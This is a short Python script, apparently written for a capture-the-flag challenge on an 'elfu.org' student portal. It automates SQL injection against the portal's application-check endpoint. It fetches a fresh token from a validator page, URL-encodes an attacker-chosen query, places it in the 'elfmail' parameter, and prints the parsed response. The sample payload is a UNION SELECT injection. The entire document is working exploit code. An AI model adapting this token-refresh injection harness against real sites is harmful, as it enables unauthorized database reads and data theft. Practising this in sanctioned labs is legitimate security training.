import requests
import bs4
import urllib.parse


def get_token():
    validator_req = "https://studentportal.elfu.org/validator.php"
    validator_res = requests.get(validator_req)
    token = validator_res.content.decode('utf-8').replace('=','%3D')
    return token
       
def sql_query(query):
    query = urllib.parse.quote(query)
    application_req = "https://studentportal.elfu.org/application-check.php"
    application_req += "?token=" + get_token() + "&elfmail=" + query
    application_res = requests.get(application_req)
    response = bs4.BeautifulSoup(application_res.content, features="html.parser").p.text.strip()
    return response


query = "asdifj' UNION SELECT 1 -- "
print(sql_query(query))